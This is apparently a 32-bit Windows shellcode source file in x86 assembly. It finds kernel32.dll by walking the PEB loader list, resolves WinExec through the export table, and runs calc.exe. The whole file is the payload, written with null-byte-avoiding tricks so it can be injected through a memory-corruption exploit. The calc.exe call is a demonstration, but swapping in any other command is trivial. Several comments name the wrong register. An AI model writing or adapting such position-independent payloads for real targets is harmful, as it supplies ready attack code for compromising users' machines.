[bits 32]

jmp begin

; eax, ebx = ptr to strs
; ret eax=0 equal
CmpStr:
    push ebx
    push ecx
    mov ecx, eax
    xor eax, eax
CmpStrLoop:
    mov al, [ecx]
    cmp al, [ebx]
    jne CmpStrEnd
    test al, al
    jz CmpStrEnd
    inc ecx
    inc ebx
    jmp CmpStrLoop
CmpStrEnd:
    pop ecx
    pop ebx
    ret

; eax = ptr to str
; ret eax
GetExportByName:
    push ebx
    push ecx
    push edx
    push esi
    push edi

    mov ebx, eax

    xor ecx, ecx
    mov ecx, fs:[ecx + 0x30]    ; eax = PEB
    add ecx, 8
    mov ecx, [ecx + 4]         ; eax = _PEB_LDR_DATA
    add ecx, 8
    mov ecx, [ecx + 4]         ; eax = process
    dec ecx
    mov ecx, [ecx + 1]          ; eax = ntdll.dll
    dec ecx
    mov ecx, [ecx + 1]          ; ecx = kernel32.dll

    mov ecx, [ecx + 0x18]       ; ecx = kernel32.dll base
    mov edx, [ecx + 0x3C]       ; edx = header offset
    mov edx, [ecx + edx + 0x78] ; edx = export table offset

    inc edx
    mov esi, [ecx + edx + 0x1F] ; esi = names offset
    dec edx
    add esi, ecx                ; esi = names address
    mov edi, -1
GetExportByNameLoop:
    inc edi
    mov eax, [esi + edi * 4]
    add eax, ecx
    call CmpStr
    test eax, eax
    jnz GetExportByNameLoop

    ; now edi = name index
    mov esi, [ecx + edx + 0x24] ; esi = names ordinals offset
    add esi, ecx                ; esi = address of names ordinals
    xor eax, eax
    mov ax, [esi + edi * 2]    ; eax = ordinal

    mov esi, [ecx + edx + 0x1c] ; esi = address of funtions offset
    add esi, ecx                ; esi = address of address of functions
    mov eax, [esi + eax * 4]    ; eax = offset of function
    add eax, ecx                ; eax = address of function

    pop edi
    pop esi
    pop edx
    pop ecx
    pop ebx

    ret

begin:
    mov ebx, 'xxec'
    shr ebx, 8
    push ebx
    push 'WinE'
    mov eax, esp
    call GetExportByName
    xor ebx, ebx
    push ebx
    push '.exe'
    push 'calc'
    mov ebx, esp
    push 5
    push ebx
    call eax
